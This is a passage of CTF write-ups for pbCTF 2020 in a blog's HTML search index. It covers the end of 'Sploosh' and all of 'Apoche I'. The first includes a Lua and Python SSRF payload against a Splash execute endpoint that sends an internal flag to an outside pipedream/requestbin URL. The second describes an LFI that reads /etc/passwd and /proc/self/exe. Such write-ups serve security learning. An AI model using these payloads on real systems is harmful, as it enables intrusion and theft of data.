class="keyword">if</span> (<span class="variable">$remote_ip</span> === <span class="string">&quot;172.16.0.13&quot;</span> || <span class="variable">$remote_ip</span> === <span class="string">&#x27;172.16.0.14&#x27;</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;No flag for you :)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s check the source code of flag.php. If the connection IP is <code>172.16.0.13</code> or <code>172.16.0.14</code>, you can see the flag is given.</p><p>And looking at the flag.php source code, you can see that the flag is only output on the internal server. So it looks like we need to put the flag in a specific variable and bring it to our private server.</p><p>Now I’ve searched for Sploosh to do an exploit. If you check <a href="https://splash.readthedocs.io/en/stable/scripting-tutorial.html#scripting-tutorial">Sploosh’s official homepage</a>, you find that you can create and run Lua scripts by connecting to the <code>execute</code> endpoint.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Sploosh/2.png?raw=true"></p><p>The picture above is on the official Sploosh website. Looking at the contents, you can see that the <code>execute</code> endpoint sends the RCE payload using the lua_source parameter.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">(exploit, args)</span></span></span><br><span class="line">  exploit:go(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">  <span class="keyword">local</span> flag = splash:html()</span><br><span class="line">  exploit:go(<span class="string">&quot;requestbin&quot;</span> .. flag)</span><br><span class="line">  <span class="keyword">return</span> &#123;geometry=data&#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>So, I wrote the SSRF + RCE payload as above using the lua script.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = requests.get(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">requests.get(<span class="string">&quot;requestbin&quot;</span>+flag)</span><br></pre></td></tr></table></figure><p>If the exploit code is interpreted in Python, it is as above.</p><p>Finally, if you connect and send the exploit code above to the excute endpoint, a flag will come to requestbin. (<code>URL encoding</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : http%3A%2F%2Flocalhost%3A8050%2Fexecute%3Flua_source%3Dfunction%2520main%28splash%2C%2520args%29%2520splash%3Ago%28%2522http%3A%2F%2F172.16.0.14%2Fflag.php%2522%29%2520local%2520data%2520%3D%2520splash%3Ahtml%28%29%2520splash%3Ago%28%2522https:&#x2F;&#x2F;66409bdd5f994b912d1a7f0f28d3b33f.m.pipedream.net%2F%2522%2520..%2520data%29%2520return%2520%7Bgeometry%3Ddata%7D%2520end</span><br></pre></td></tr></table></figure><p>So, I’ll URL-encode the exploit code and pass it over.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Sploosh/3.png?raw=true"></p><p>When I sent the above exploit payload, I could see the flag coming to the requestbin.</p><blockquote><p>FLAG : pbctf{1_h0p3_y0u_us3d_lua_f0r_th1s}</p></blockquote><hr><h2 id="Web-Apoche-I-58-pts"><a href="#Web-Apoche-I-58-pts" class="headerlink" title=" (Web) Apoche I [58 pts]"></a><span style="color:#21C587"></span> (Web) Apoche I [58 pts]</h2><p>This time, we will solve a challenge called Apoche I among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/1.png?raw=true"><br>Looking at the challenge description, there are 5 URLs given. You can connect to an open server among 5 servers. (Some servers are closed.)</p><p>And looking at the hint, it says to get information about the binary.<br><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/2.png?raw=true"><br>I connected to 34.68.159.75:41521, and when I checked the robots.txt file, I could see that there is a secret directory. I thought LFI would happen here, so I grabbed a proxy and attempted an LFI attack.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/3.png?raw=true"><br>When I grabbed the request using Burp Suite and accessed the <code>/etc/passwd</code> file, I could see that the <code>LFI</code> worked well.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/4.png?raw=true"><br>So I accessed <code>/proc/self/exe</code> to get the <code>binary file</code>, and when I searched for <code>pbctf&#123;</code>, I could see that the binary file had a flag.</p><blockquote><p>FLAG : pbctf{n0t_re4lly_apache_ap0che!}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Path Traversal </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
